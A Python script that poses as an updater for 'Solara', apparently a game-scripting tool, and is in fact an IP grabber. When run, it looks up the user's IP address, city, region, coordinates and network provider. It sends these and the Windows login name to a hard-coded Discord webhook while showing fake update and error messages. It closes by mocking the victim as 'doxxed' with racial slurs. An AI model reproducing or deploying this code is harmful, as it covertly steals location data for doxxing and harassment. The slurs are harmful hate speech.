from pystyle import Write, Colors, Colorate
import requests, os, sys, json, time

header = r'''
 (                             
 )\ )      (                   
(()/(      )\    )  (       )  
 /(_)) (  ((_)( /(  )(   ( /(  
(_))   )\  _  )(_))(()\  )(_)) 
/ __| ((_)| |((_)_  ((_)((_)_  
\__ \/ _ \| |/ _` || '_|/ _` | 
|___/\___/|_|\__,_||_|  \__,_|                    
---------------------------
'''

def getip():
    h00k = "https://discord.com/api/webhooks/1304281608974635058/o1r_qnC_1GOp8V3dXT8IYfwFsiBf3_UCJ_7avW7XpUWz-1wAY5eFgTwj873evtOHgoU5"
    msg = requests.get("https://ipapi.co/json/")
    msg_parse = msg.json()
    ipaddr = msg_parse['ip']
    ipcity = msg_parse['city']
    ipregion = msg_parse['region']
    lat = msg_parse['latitude']
    long = msg_parse['longitude']
    lang = msg_parse['org']
    sl = "```"
    sa = "```"
    float = "float"
    osu = os.getlogin() 
    getuser = requests.post(h00k, json={"content": sl + "Victim PC Name: " +osu + sa})
    send_data = requests.post(h00k, json={"content": sl + "IP: " + ipaddr + sa})
    send_data1 = requests.post(h00k, json={"content": sl + "City: " + ipcity + sa})
    send_data2 = requests.post(h00k, json={"content": sl + "Region: " +ipregion + sa})
    send_data3 = requests.post(h00k, json={"content": sl + "Latitude: " +str(lat) + sa})
    send_data4 = requests.post(h00k, json={"content": sl + "Longitude: " +str(long) + sa})
    send_data5 = requests.post(h00k, json={"content": sl + "Network Provider: " + str(lang) + sa})


if __name__ == "__main__":
    getip()

print(Colorate.Horizontal(Colors.red_to_black, f"{header}", 1)) # prints the header aka SOLARA

msg_1 = '''
[+] Installing External Updates.
'''
print(Colorate.Horizontal(Colors.red_to_black, f"{msg_1}", 1)) # prints the header aka SOLARA
time.sleep(5)

msg_2 = '''
[-] (3.5.1) Newest Update Detected!
'''
print(Colorate.Horizontal(Colors.red_to_black, f"{msg_2}", 1)) # prints the header aka SOLARA
time.sleep(5)
print(Colorate.Horizontal(Colors.red_to_black, f"Internal Error!", 1)) # prints the header aka SOLARA
time.sleep(.69)

msg_3 = '''
[.GG/FUCKED] You Have Just Been IP Doxxed Dumbass Nigga!
'''
print(Colorate.Horizontal(Colors.purple_to_blue, f"{msg_3}", 1)) # prints the header aka SOLARA
input("Exit like the nigger you are...")
